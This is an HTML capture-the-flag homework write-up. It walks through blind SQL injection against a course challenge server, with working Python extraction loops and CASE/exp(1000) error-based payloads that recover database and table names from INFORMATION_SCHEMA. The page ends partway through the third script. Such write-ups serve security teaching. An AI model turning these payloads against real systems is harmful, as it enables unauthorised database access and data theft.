@@ -1,0 +1,437 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,minimum-scale=1,initial-scale=1"><link rel=stylesheet href=/markdown.css><link rel=stylesheet href=/highlight.css><title>Homework 5b Writeup | CTF Writeups</title>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js crossorigin=anonymous></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js crossorigin=anonymous></script><script>window.onload=()=>renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"\\[",right:"\\]",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1}]})</script></head><script>addEventListener("load",()=>{console.log("nothing to see here yo")},!1)</script><body><article class=container><div class=title>Homework 5b Writeup</div><div class=date>Nov 10, 2023</div><h3 id=vow-vs-gldanoob>vow vs gldanoob</h3><blockquote><p>I don’t like JS. -vow</p></blockquote><h1 id=part-0-networking>Part 0: Networking</h1><figure><img src=/hw5b/Untitled.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><p>So we arrived at the /flag page after attending the lessons (<del>and
+copying the flags</del>).</p><p>We see there is a place for us to “Run Admin Script”, and some random
+links leading to a JS tutorial and some subpar memes.</p><p>How about we check the network?</p><figure><img src=/hw5b/Untitled%201.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><p><del>ew more js.</del> Let’s filter out the JavaScript.</p><figure><img src=/hw5b/Untitled%202.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><p>We see that there is “ok” and “isolated-first.jst”. “ok” looks a bit
+weird <del>sus</del> so let’s take a look:</p><figure><img src=/hw5b/Untitled%203.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><p>And here we got our exercise flag!</p><h1 id=part-1-2633ms>Part 1: 2633ms</h1><p>Notice that the payload format for “ok” looks very familiar to SQL
+queries. Perhaps this is a possible endpoint?</p><p>Also if you recall when completing the exercise flag:</p><figure><img src=/hw5b/Untitled%204.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><p>There is a column named “lastOk” in the “users” table. Perhaps this
+is used to check whether your SQL query from the “ok” endpoint works or
+not?</p><h3 id=how-about-try-sending-a-sql-query-through-the-endpoint>How
+about try sending a SQL query through the endpoint?</h3><p>(We can use Burp/FireFox/Python to send the payload, if anyone knows
+how to do it with Chrome please @ me, in our case we use Python with the
+requests module because snake good.)</p><div class=sourceCode id=cb1><pre class="sourceCode python"><code class="sourceCode python"><span id=cb1-1><a href=#cb1-1 aria-hidden=true tabindex=-1></a><span class=im>import</span> requests</span>
+<span id=cb1-2><a href=#cb1-2 aria-hidden=true tabindex=-1></a></span>
+<span id=cb1-3><a href=#cb1-3 aria-hidden=true tabindex=-1></a><span class=co># Since the &quot;ok&quot; endpoint is in /flag, that basically means </span></span>
+<span id=cb1-4><a href=#cb1-4 aria-hidden=true tabindex=-1></a><span class=co># we need credentials in order to be able to send requests.</span></span>
+<span id=cb1-5><a href=#cb1-5 aria-hidden=true tabindex=-1></a></span>
+<span id=cb1-6><a href=#cb1-6 aria-hidden=true tabindex=-1></a><span class=co>#yum</span></span>
+<span id=cb1-7><a href=#cb1-7 aria-hidden=true tabindex=-1></a>cookies <span class=op>=</span> {</span>
+<span id=cb1-8><a href=#cb1-8 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;next-auth.csrf-token&#39;</span>: <span class=st>&#39;Fill it in yourself.&#39;</span></span>
+<span id=cb1-9><a href=#cb1-9 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;next-auth.callback-url&#39;</span>: <span class=st>&#39;Fill it in yourself.&#39;</span></span>
+<span id=cb1-10><a href=#cb1-10 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;next-auth.session-token&#39;</span>: <span class=st>&#39;Fill it in yourself.&#39;</span>,</span>
+<span id=cb1-11><a href=#cb1-11 aria-hidden=true tabindex=-1></a>           }</span>
+<span id=cb1-12><a href=#cb1-12 aria-hidden=true tabindex=-1></a></span>
+<span id=cb1-13><a href=#cb1-13 aria-hidden=true tabindex=-1></a><span class=co>#https requests headers</span></span>
+<span id=cb1-14><a href=#cb1-14 aria-hidden=true tabindex=-1></a>headers <span class=op>=</span> {</span>
+<span id=cb1-15><a href=#cb1-15 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;User-Agent&#39;</span>: <span class=st>&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0&#39;</span>,</span>
+<span id=cb1-16><a href=#cb1-16 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;Accept&#39;</span>: <span class=st>&#39;*/*&#39;</span>,</span>
+<span id=cb1-17><a href=#cb1-17 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;Accept-Language&#39;</span>: <span class=st>&#39;en-US,en;q=0.5&#39;</span>,</span>
+<span id=cb1-18><a href=#cb1-18 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;Connection&#39;</span>: <span class=st>&#39;keep-alive&#39;</span>,</span>
+<span id=cb1-19><a href=#cb1-19 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;Content-Type&#39;</span>: <span class=st>&#39;text/plain;charset=UTF-8&#39;</span>,</span>
+<span id=cb1-20><a href=#cb1-20 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;Pragma&#39;</span>: <span class=st>&#39;no-cache&#39;</span>,</span>
+<span id=cb1-21><a href=#cb1-21 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;Cache-Control&#39;</span>: <span class=st>&#39;no-cache&#39;</span>,</span>
+<span id=cb1-22><a href=#cb1-22 aria-hidden=true tabindex=-1></a>        }</span>
+<span id=cb1-23><a href=#cb1-23 aria-hidden=true tabindex=-1></a></span>
+<span id=cb1-24><a href=#cb1-24 aria-hidden=true tabindex=-1></a><span class=co># Simple function to get &quot;lastOk&quot; time before sending any SQL queries.</span></span>
+<span id=cb1-25><a href=#cb1-25 aria-hidden=true tabindex=-1></a><span class=kw>def</span> get_last_ok():</span>
+<span id=cb1-26><a href=#cb1-26 aria-hidden=true tabindex=-1></a></span>
+<span id=cb1-27><a href=#cb1-27 aria-hidden=true tabindex=-1></a>        <span class=co># Notice that &quot;users&quot; also has an API endpoint, we can basically send SQL requests</span></span>
+<span id=cb1-28><a href=#cb1-28 aria-hidden=true tabindex=-1></a>        <span class=co># directly to /api/users to get data from the table, which is the same as doing it </span></span>
+<span id=cb1-29><a href=#cb1-29 aria-hidden=true tabindex=-1></a>        <span class=co># on the web. You can check the format again using Networking on your browser.</span></span>
+<span id=cb1-30><a href=#cb1-30 aria-hidden=true tabindex=-1></a>    user_res <span class=op>=</span> requests.post(<span class=st>&#39;http://chal.firebird.sh:35020/api/users&#39;</span>, cookies<span class=op>=</span>cookies, headers<span class=op>=</span>headers, data<span class=op>=</span>data_for_users)</span>
+<span id=cb1-31><a href=#cb1-31 aria-hidden=true tabindex=-1></a>    </span>
+<span id=cb1-32><a href=#cb1-32 aria-hidden=true tabindex=-1></a>        <span class=co># Parsing json</span></span>
+<span id=cb1-33><a href=#cb1-33 aria-hidden=true tabindex=-1></a>        user_res <span class=op>=</span> user_res.json()</span>
+<span id=cb1-34><a href=#cb1-34 aria-hidden=true tabindex=-1></a>    current_time <span class=op>=</span> user_res[<span class=st>&#39;tables&#39;</span>][<span class=dv>0</span>][<span class=dv>0</span>][<span class=st>&#39;lastOk&#39;</span>]</span>
+<span id=cb1-35><a href=#cb1-35 aria-hidden=true tabindex=-1></a>    <span class=cf>return</span> current_time</span>
+<span id=cb1-36><a href=#cb1-36 aria-hidden=true tabindex=-1></a></span>
+<span id=cb1-37><a href=#cb1-37 aria-hidden=true tabindex=-1></a>last_ok <span class=op>=</span> get_last_ok()</span>
+<span id=cb1-38><a href=#cb1-38 aria-hidden=true tabindex=-1></a></span>
+<span id=cb1-39><a href=#cb1-39 aria-hidden=true tabindex=-1></a><span class=co># \&#39; is used to treat &#39; as a string, instead of closing the brackets.</span></span>
+<span id=cb1-40><a href=#cb1-40 aria-hidden=true tabindex=-1></a>sql_for_flag <span class=op>=</span> <span class=st>&#39;{&quot;ok&quot;: &quot;SELECT </span><span class=ch>\&#39;</span><span class=st>femboys</span><span class=ch>\&#39;</span><span class=st>&quot;}&#39;</span></span>
+<span id=cb1-41><a href=#cb1-41 aria-hidden=true tabindex=-1></a></span>
+<span id=cb1-42><a href=#cb1-42 aria-hidden=true tabindex=-1></a><span class=co># SQL for getting just your account&#39;s &quot;lastOk&quot;. </span></span>
+<span id=cb1-43><a href=#cb1-43 aria-hidden=true tabindex=-1></a><span class=co># Replace the id with your account id.</span></span>
+<span id=cb1-44><a href=#cb1-44 aria-hidden=true tabindex=-1></a>sql_for_users <span class=op>=</span> <span class=st>&#39;{&quot;query&quot;:&quot;</span><span class=ch>\&#39;\&#39;</span><span class=st> or id = 6969 #&quot;}&#39;</span></span>
+<span id=cb1-45><a href=#cb1-45 aria-hidden=true tabindex=-1></a></span>
+<span id=cb1-46><a href=#cb1-46 aria-hidden=true tabindex=-1></a>flag_response <span class=op>=</span> requests.post(<span class=st>&#39;http://chal.firebird.sh:35020/api/ok&#39;</span>, cookies<span class=op>=</span>cookies, headers<span class=op>=</span>headers , data<span class=op>=</span>data)</span>
+<span id=cb1-47><a href=#cb1-47 aria-hidden=true tabindex=-1></a>user_response <span class=op>=</span> requests.post(<span class=st>&#39;http://chal.firebird.sh:35020/api/users&#39;</span>, cookies<span class=op>=</span>cookies, headers<span class=op>=</span>headers , data<span class=op>=</span>data_for_users)</span>
+<span id=cb1-48><a href=#cb1-48 aria-hidden=true tabindex=-1></a>user_response <span class=op>=</span> user_response.json()</span>
+<span id=cb1-49><a href=#cb1-49 aria-hidden=true tabindex=-1></a>new_ok <span class=op>=</span> user_response[<span class=st>&#39;tables&#39;</span>][<span class=dv>0</span>][<span class=dv>0</span>][<span class=st>&#39;lastOk&#39;</span>]</span>
+<span id=cb1-50><a href=#cb1-50 aria-hidden=true tabindex=-1></a></span>
+<span id=cb1-51><a href=#cb1-51 aria-hidden=true tabindex=-1></a><span class=co># Checking whether the &quot;lastOk&quot; time was updated or not.</span></span>
+<span id=cb1-52><a href=#cb1-52 aria-hidden=true tabindex=-1></a><span class=cf>if</span> new_ok <span class=op>!=</span> last_ok:</span>
+<span id=cb1-53><a href=#cb1-53 aria-hidden=true tabindex=-1></a>    <span class=bu>print</span>(<span class=st>&quot;El Psy Congroo.&quot;</span>)</span></code></pre></div><p>Explanation: We are sending a SQL query through the /api/ok endpoint
+and see whether “lastOk” updates. The query we are using is:</p><p><code>SELECT ‘some_random_string’</code></p><p>In theory, this would output something like this:</p><figure><img src=/hw5b/Untitled%205.png alt=Untitled><figcaption aria-hidden=true>Untitled</figcaption></figure><p>This allows our query to output something even if we don’t know any
+of the tables’ names. The only way this would not work is:</p><ol type=1><li>Like exercise flag, we have to do UNION injection, hence the number
+of columns may be wrong.</li><li>We are injecting into a SQL query.</li><li>The api/ok endpoint does not process SQL queries.</li></ol><p>Running the code, the console prints “El Psy Congroo.” And if we
+change our payload to gibberish, nothing is printed. This confirms our
+theory that /api/ok takes SQL queries. (Can also verify by checking the
+Networking and see if you receive “Internal Server Error”)</p><h3 id=now-heres-the-question-is-the-databasesession-accessed-through-apiok-the-same-as-the-one-in-users>Now
+here’s the question: Is the database/session accessed through /api/ok
+the same as the one in /users?</h3><p>Well, we can just change our payload to
+<code>SELECT * FROM users</code> , and we can see that lastOk did not
+update. Therefore, /api/ok leads to a new database/session, and there is
+probably a flag in a table that we don’t know the name of, nor its
+column names.</p><p>But here is a problem: We only know whether our SQL query
+<strong>runs or not</strong>, we currently have no method of knowing
+what the SQL query <strong>outputs</strong>.</p><h3 id=can-we-make-a-payload-that-allows-us-to-find-out-what-the-sql-query-outputs-yes-and-that-is-called-blindsqli.>Can
+we make a payload that allows us to find out what the SQL query outputs?
+Yes, and that is called BlindSQLi.</h3><p>Different database have different commands, and since this challenge
+uses MySQL, it also has some of its own commands. One of which is
+<code>DATABASE();</code> , which returns the database name. <strong>Can
+we try to get the name of the database using the command?</strong></p><p>Assuming that the database name has 16 characters and only consists
+of small alphabets, if we were to guess the name randomly, we would
+have:</p><p><span class="math display">\[
+26^{16} \text{ different combinations}
+\]</span></p><p>Not ideal.</p><p>But what is there is a way for us to guess each letter individually?
+Then we would only need to go through:</p><p><span class="math display">\[
+26*16=416 \text{ tries}
+\]</span></p><p>And that good news is that we can do exactly that.</p><p>We know that in SQL <code>1=1</code> evaluates to true, but did you
+know we can do the same with characters?</p><pre><code># ascii is like Python&#39;s ord() but for SQL
+SELECT username FROM users WHERE username = &#39;uwu&#39; or ascii(&#39;A&#39;) = 65
+SELECT username FROM users WHERE username = &#39;owo&#39; or &#39;A&#39; = &#39;A&#39;</code></pre><p>Both of these queries will output all usernames, since the logic
+becomes:</p><p><code>username = 'something' or True</code></p><p>Next, how do we go through each character individually? Since
+<code>DATABASE();</code> will output the full name. If the database name
+is “UwU”, then we would just be doing this:</p><p><code>“UwU” = “insert_a_single_character”</code></p><p>Which will always be false. Luckily, SQL has a function called
+<code>substring();</code> , and it works like this:</p><pre><code># Substring takes in 3 arguments:
+# the string, 
+# the starting position (first character is 1)
+# and how many characters you want (including starting position)
+SELECT SUBSTRING(&quot;UST has no femboys&quot;, 1, 3) AS ExtractedText;
+
+# This will output a table like:
+# ExtractedText
+# ===============
+# UST</code></pre><p>Now our final problem, how do we know whether there is an output?
+LastOk is an indicator for whether your SQL query has successfully ran,
+but it does not tell us anything about whether the query returns
+something or nothing. It would be nice if there was something like a
+if-else statement for SQL. <strong>(>ᴗ•) !</strong></p><p>Introducing SQL <code>CASE</code> expression!</p><p>Wooooooooooooooahhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh!</p><figure><img src=/hw5b/spy-x-family-spy-family.gif alt=spy-x-family-spy-family.gif><figcaption aria-hidden=true>spy-x-family-spy-family.gif</figcaption></figure><p>Essentially, the case expression can act as an if-else statement, and
+we can create a payload that tells us whether a character matches or
+not. If it matches, update lastOk, if not, we can use error-based SQL
+injection so that the SQL query cannot be processed, hence not updating
+lastOk even if we pass in a correct query.</p><h3 id=therefore-if-we-wanted-to-find-the-first-letter-of-the-database-name-our-query-would-be><strong>Therefore,
+if we wanted to find the first letter of the database name, our query
+would be:</strong></h3><p><code>SELECT CASE WHEN ascii((substring(DATABASE(), 1, 1))) = ' + random_character_integer_value + ' THEN \'lol\' ELSE exp(1000) END</code></p><p>Explanation: Assume that the database name is “UwU”, if the first
+character’s integer value is equal to the one we want to check, our
+statement will become:</p><p><code>SELECT ‘lol’</code></p><p>Which will run and update lastOk, otherwise it becomes:</p><p><code>SELECT exp(1000)</code></p><p>Which equals to <span class="math inline">\(e^{1000}\)</span>, and it
+will cause an overflow error, hence the SQL query will not successfully
+run, and lastOk will not be updated.</p><p>Now, let’s edit the script, automate it and find the database
+name:</p><div class=sourceCode id=cb4><pre class="sourceCode python"><code class="sourceCode python"><span id=cb4-1><a href=#cb4-1 aria-hidden=true tabindex=-1></a><span class=im>import</span> requests</span>
+<span id=cb4-2><a href=#cb4-2 aria-hidden=true tabindex=-1></a></span>
+<span id=cb4-3><a href=#cb4-3 aria-hidden=true tabindex=-1></a>cookies <span class=op>=</span> {</span>
+<span id=cb4-4><a href=#cb4-4 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;next-auth.csrf-token&#39;</span>: <span class=st>&#39;Fill it in yourself.&#39;</span></span>
+<span id=cb4-5><a href=#cb4-5 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;next-auth.callback-url&#39;</span>: <span class=st>&#39;Fill it in yourself.&#39;</span></span>
+<span id=cb4-6><a href=#cb4-6 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;next-auth.session-token&#39;</span>: <span class=st>&#39;Fill it in yourself.&#39;</span>,</span>
+<span id=cb4-7><a href=#cb4-7 aria-hidden=true tabindex=-1></a>           }</span>
+<span id=cb4-8><a href=#cb4-8 aria-hidden=true tabindex=-1></a></span>
+<span id=cb4-9><a href=#cb4-9 aria-hidden=true tabindex=-1></a>headers <span class=op>=</span> {</span>
+<span id=cb4-10><a href=#cb4-10 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;User-Agent&#39;</span>: <span class=st>&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0&#39;</span>,</span>
+<span id=cb4-11><a href=#cb4-11 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;Accept&#39;</span>: <span class=st>&#39;*/*&#39;</span>,</span>
+<span id=cb4-12><a href=#cb4-12 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;Accept-Language&#39;</span>: <span class=st>&#39;en-US,en;q=0.5&#39;</span>,</span>
+<span id=cb4-13><a href=#cb4-13 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;Connection&#39;</span>: <span class=st>&#39;keep-alive&#39;</span>,</span>
+<span id=cb4-14><a href=#cb4-14 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;Content-Type&#39;</span>: <span class=st>&#39;text/plain;charset=UTF-8&#39;</span>,</span>
+<span id=cb4-15><a href=#cb4-15 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;Pragma&#39;</span>: <span class=st>&#39;no-cache&#39;</span>,</span>
+<span id=cb4-16><a href=#cb4-16 aria-hidden=true tabindex=-1></a>            <span class=st>&#39;Cache-Control&#39;</span>: <span class=st>&#39;no-cache&#39;</span>,</span>
+<span id=cb4-17><a href=#cb4-17 aria-hidden=true tabindex=-1></a>        }</span>
+<span id=cb4-18><a href=#cb4-18 aria-hidden=true tabindex=-1></a></span>
+<span id=cb4-19><a href=#cb4-19 aria-hidden=true tabindex=-1></a><span class=kw>def</span> get_last_ok():</span>
+<span id=cb4-20><a href=#cb4-20 aria-hidden=true tabindex=-1></a>    user_res <span class=op>=</span> requests.post(<span class=st>&#39;http://chal.firebird.sh:35020/api/users&#39;</span>, cookies<span class=op>=</span>cookies, headers<span class=op>=</span>headers, data<span class=op>=</span>data_for_users)</span>
+<span id=cb4-21><a href=#cb4-21 aria-hidden=true tabindex=-1></a>        user_res <span class=op>=</span> user_res.json()</span>
+<span id=cb4-22><a href=#cb4-22 aria-hidden=true tabindex=-1></a>    current_time <span class=op>=</span> user_res[<span class=st>&#39;tables&#39;</span>][<span class=dv>0</span>][<span class=dv>0</span>][<span class=st>&#39;lastOk&#39;</span>]</span>
+<span id=cb4-23><a href=#cb4-23 aria-hidden=true tabindex=-1></a>    <span class=cf>return</span> current_time</span>
+<span id=cb4-24><a href=#cb4-24 aria-hidden=true tabindex=-1></a></span>
+<span id=cb4-25><a href=#cb4-25 aria-hidden=true tabindex=-1></a><span class=co># Usually user created databased are all lower case.</span></span>
+<span id=cb4-26><a href=#cb4-26 aria-hidden=true tabindex=-1></a>character_list <span class=op>=</span> <span class=st>&#39;{_$@.-/}abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span></span>
+<span id=cb4-27><a href=#cb4-27 aria-hidden=true tabindex=-1></a>sql_for_users <span class=op>=</span> <span class=st>&#39;{&quot;query&quot;:&quot;</span><span class=ch>\&#39;\&#39;</span><span class=st> or id = 6969 #&quot;}&#39;</span></span>
+<span id=cb4-28><a href=#cb4-28 aria-hidden=true tabindex=-1></a></span>
+<span id=cb4-29><a href=#cb4-29 aria-hidden=true tabindex=-1></a><span class=co># If this reaches the length of our character_list, that either means we are done or</span></span>
+<span id=cb4-30><a href=#cb4-30 aria-hidden=true tabindex=-1></a><span class=co># the code is messed up :(</span></span>
+<span id=cb4-31><a href=#cb4-31 aria-hidden=true tabindex=-1></a>terminate_counter <span class=op>=</span> <span class=dv>0</span> </span>
+<span id=cb4-32><a href=#cb4-32 aria-hidden=true tabindex=-1></a>letter_position <span class=op>=</span> <span class=dv>1</span></span>
+<span id=cb4-33><a href=#cb4-33 aria-hidden=true tabindex=-1></a>last_ok <span class=op>=</span> get_last_ok()</span>
+<span id=cb4-34><a href=#cb4-34 aria-hidden=true tabindex=-1></a>database_name <span class=op>=</span> <span class=st>&quot;&quot;</span></span>
+<span id=cb4-35><a href=#cb4-35 aria-hidden=true tabindex=-1></a></span>
+<span id=cb4-36><a href=#cb4-36 aria-hidden=true tabindex=-1></a><span class=cf>while</span> (terminate_counter <span class=op>!=</span> <span class=bu>len</span>(character_list)):</span>
+<span id=cb4-37><a href=#cb4-37 aria-hidden=true tabindex=-1></a>    terminate_counter <span class=op>=</span> <span class=dv>0</span></span>
+<span id=cb4-38><a href=#cb4-38 aria-hidden=true tabindex=-1></a>    <span class=cf>for</span> char <span class=kw>in</span> character_list:</span>
+<span id=cb4-39><a href=#cb4-39 aria-hidden=true tabindex=-1></a>        char_num <span class=op>=</span> <span class=bu>ord</span>(char)</span>
+<span id=cb4-40><a href=#cb4-40 aria-hidden=true tabindex=-1></a>        sql_for_flag <span class=op>=</span> <span class=st>&#39;{&quot;ok&quot;:&quot;SELECT CASE WHEN ascii((substring(DATABASE(), &#39;</span> <span class=op>+</span> <span class=bu>str</span>(letter_position) <span class=op>+</span> <span class=st>&#39;, 1))) = &#39;</span> <span class=op>+</span> <span class=bu>str</span>(char_num) <span class=op>+</span> <span class=st>&#39; THEN </span><span class=ch>\&#39;</span><span class=st>lol</span><span class=ch>\&#39;</span><span class=st> ELSE exp(1000) END&quot;}&#39;</span></span>
+<span id=cb4-41><a href=#cb4-41 aria-hidden=true tabindex=-1></a>        flag_response <span class=op>=</span> requests.post(<span class=st>&#39;http://chal.firebird.sh:35020/api/ok&#39;</span>, cookies<span class=op>=</span>cookies, headers<span class=op>=</span>headers , data<span class=op>=</span>sql_for_flag)</span>
+<span id=cb4-42><a href=#cb4-42 aria-hidden=true tabindex=-1></a>        user_response <span class=op>=</span> requests.post(<span class=st>&#39;http://chal.firebird.sh:35020/api/users&#39;</span>, cookies<span class=op>=</span>cookies, headers<span class=op>=</span>headers , data<span class=op>=</span>data_for_users)</span>
+<span id=cb4-43><a href=#cb4-43 aria-hidden=true tabindex=-1></a>        user_response <span class=op>=</span> user_response.json()</span>
+<span id=cb4-44><a href=#cb4-44 aria-hidden=true tabindex=-1></a>        new_ok <span class=op>=</span> user_response[<span class=st>&#39;tables&#39;</span>][<span class=dv>0</span>][<span class=dv>0</span>][<span class=st>&#39;lastOk&#39;</span>]</span>
+<span id=cb4-45><a href=#cb4-45 aria-hidden=true tabindex=-1></a>        </span>
+<span id=cb4-46><a href=#cb4-46 aria-hidden=true tabindex=-1></a>        <span class=cf>if</span> new_ok <span class=op>!=</span> last_ok:</span>
+<span id=cb4-47><a href=#cb4-47 aria-hidden=true tabindex=-1></a>            letter_position <span class=op>+=</span> <span class=dv>1</span></span>
+<span id=cb4-48><a href=#cb4-48 aria-hidden=true tabindex=-1></a>            database_name <span class=op>+=</span> char</span>
+<span id=cb4-49><a href=#cb4-49 aria-hidden=true tabindex=-1></a>            last_ok <span class=op>=</span> new_ok <span class=co># Update the time</span></span>
+<span id=cb4-50><a href=#cb4-50 aria-hidden=true tabindex=-1></a>            <span class=bu>print</span>(database_name)</span>
+<span id=cb4-51><a href=#cb4-51 aria-hidden=true tabindex=-1></a>            <span class=cf>break</span></span>
+<span id=cb4-52><a href=#cb4-52 aria-hidden=true tabindex=-1></a>        <span class=cf>else</span>:</span>
+<span id=cb4-53><a href=#cb4-53 aria-hidden=true tabindex=-1></a>            terminate_counter <span class=op>+=</span> <span class=dv>1</span></span>
+<span id=cb4-54><a href=#cb4-54 aria-hidden=true tabindex=-1></a><span class=bu>print</span>(<span class=st>&quot;Done!&quot;</span>)</span></code></pre></div><p>After a while, we would get “<strong>firebird</strong>”, and that is
+our database name.</p><p>Now, if we want to find the table name, we can reuse our payload and
+make some modifications:</p><div class=sourceCode id=cb5><pre class="sourceCode sql"><code class="sourceCode sql"><span id=cb5-1><a href=#cb5-1 aria-hidden=true tabindex=-1></a><span class=kw>SELECT</span> <span class=cf>CASE</span> <span class=cf>WHEN</span> <span class=kw>EXISTS</span>(<span class=kw>SELECT</span> table_name, table_schema <span class=kw>FROM</span> INFORMATION_SCHEMA.<span class=kw>TABLES</span> <span class=kw>WHERE</span> table_name <span class=kw>LIKE</span> \<span class=st>&#39;&#39;</span> <span class=op>+</span> database_name <span class=op>+</span> <span class=dt>char</span> <span class=op>+</span> <span class=st>&#39;%\&#39;</span> <span class=kw>AND</span> table_schema <span class=op>=</span> (\<span class=st>&#39;firebird\&#39;</span>)) <span class=cf>THEN</span> \<span class=st>&#39;lol\&#39;</span> <span class=cf>ELSE</span> <span class=fu>exp</span>(<span class=dv>1000</span>) <span class=cf>END</span></span></code></pre></div><p>Explanation: As we know, all the table names are stored in
+<code>INFORMATION_SCHEMA.TABLES</code>, however it also contains lots of
+predefined tables, which will heavily affect our search process. To
+filter out those tables, we can add <code>table_schema</code> column and
+look for tables that have <code>table_schema = firebird</code> (that is
+why we need to find the database name first).</p><p>Since we don’t know the exact table name, we would have to use the
+<code>LIKE</code> expression. <code>LIKE</code> can search for a
+specified pattern in a column. For example, if you want to find all
+tables that start with “UwU”, you could do
+<code>table_name = ‘UwU%’</code>.</p><p>Lastly, we use the <code>EXISTS</code> expression. If the query
+returns nothing, then <code>EXISTS</code> will return false, otherwise
+it will return true.</p><p>Again, let’s modify our code and run the script:</p><div class=sourceCode id=cb6><pre class="sourceCode python"><code class="sourceCode python"><span id=cb6-1><a href=#cb6-1 aria-hidden=true tabindex=-1></a><span class=co># Remember to copy the code above in previous code blocks.</span></span>
+<span id=cb6-2><a href=#cb6-2 aria-hidden=true tabindex=-1></a><span class=co># Not writing it here to save space.</span></span>
+<span id=cb6-3><a href=#cb6-3 aria-hidden=true tabindex=-1></a></span>
+<span id=cb6-4><a href=#cb6-4 aria-hidden=true tabindex=-1></a>terminate_counter <span class=op>=</span> <span class=dv>0</span> </span>
+<span id=cb6-5><a href=#cb6-5 aria-hidden=true tabindex=-1></a>letter_position <span class=op>=</span> <span class=dv>1</span></span>
+<span id=cb6-6><a href=#cb6-6 aria-hidden=true tabindex=-1></a>last_ok <span class=op>=</span> get_last_ok()</span>
+<span id=cb6-7><a href=#cb6-7 aria-hidden=true tabindex=-1></a>database_name <span class=op>=</span> <span class=st>&quot;&quot;</span></span>
+<span id=cb6-8><a href=#cb6-8 aria-hidden=true tabindex=-1></a></span>
+<span id=cb6-9><a href=#cb6-9 aria-hidden=true tabindex=-1></a><span class=cf>while</span> (terminate_counter <span class=op>!=</span> <span class=bu>len</span>(character_list)):</span>
+<span id=cb6-10><a href=#cb6-10 aria-hidden=true tabindex=-1></a>    terminate_counter <span class=op>=</span> <span class=dv>0</span></span>
+<span id=cb6-11><a href=#cb6-11 aria-hidden=true tabindex=-1></a>    <span class=cf>for</span> char <span class=kw>in</span> character_list:</span>
+<span id=cb6-12><a href=#cb6-12 aria-hidden=true tabindex=-1></a>        char_num <span class=op>=</span> <span class=bu>ord</span>(char)</span>
+<span id=cb6-13><a href=#cb6-13 aria-hidden=true tabindex=-1></a>        sql_for_flag <span class=op>=</span> <span class=st>&#39;{&quot;ok&quot;:&quot;SELECT CASE WHEN EXISTS(SELECT table_name, table_schema FROM INFORMATION_SCHEMA.TABLES WHERE table_name LIKE </span><span class=ch>\&#39;</span><span class=st>&#39;</span> <span class=op>+</span> database_name <span class=op>+</span> char <span class=op>+</span> <span class=st>&#39;%</span><span class=ch>\&#39;</span><span class=st> AND table_schema = (</span><span class=ch>\&#39;</span><span class=st>firebird</span><span class=ch>\&#39;</span><span class=st>)) THEN </span><span class=ch>\&#39;</span><span class=st>lol</span><span class=ch>\&#39;</span><span class=st> ELSE exp(1000) END&quot;}&#39;</span></span>
+<span id=cb6-14><a href=#cb6-14 aria-hidden=true tabindex=-1></a>        flag_response <span class=op>=</span> requests.post(<span class=st>&#39;http://chal.firebird.sh:35020/api/ok&#39;</span>, cookies<span class=op>=</span>cookies, headers<span class=op>=</span>headers , data<span class=op>=</span>sql_for_flag)</span>
+<span id=cb6-15><a href=#cb6-15 aria-hidden=true tabindex=-1></a>        user_response <span class=op>=</span> requests.post(<span class=st>&#39;http://chal.firebird.sh:35020/api/users&#39;</span>, cookies<span class=op>=</span>cookies, headers<span class=op>=</span>headers , data<span class=op>=</span>data_for_users)</span>
+<span id=cb6-16><a href=#cb6-16 aria-hidden=true tabindex=-1></a>        user_response <span class=op>=</span> user_response.json()</span>
+<span id=cb6-17><a href=#cb6-17 aria-hidden=true tabindex=-1></a>        new_ok <span class=op>=</span> user_response[<span class=st>&#39;tables&#39;</span>][<span class=dv>0</span>][<span class=dv>0</span>][<span class=st>&#39;lastOk&#39;</span>]</span>
+<span id=cb6-18><a href=#cb6-18 aria-hidden=true tabindex=-1></a>        <span class=cf>if</span> new_ok <span class=op>!=</span> last_ok:</span>
+<span id=cb6-19><a href=#cb6-19 aria-hidden=true tabindex=-1></a>            letter_position <span class=op>+=</span> <span class=dv>1</span></span>
+<span id=cb6-20><a href=#cb6-20 aria-hidden=true tabindex=-1></a>            database_name <span class=op>+=</span> char</span>
+<span id=cb6-21><a href=#cb6-21 aria-hidden=true tabindex=-1></a>            last_ok <span class=op>=</span> new_ok</span>
+<span id=cb6-22><a href=#cb6-22 aria-hidden=true tabindex=-1></a>            <span class=bu>print</span>(database_name)</span>
+<span id=cb6-23><a href=#cb6-23 aria-hidden=true tabindex=-1></a>            <span class=cf>break</span></span>
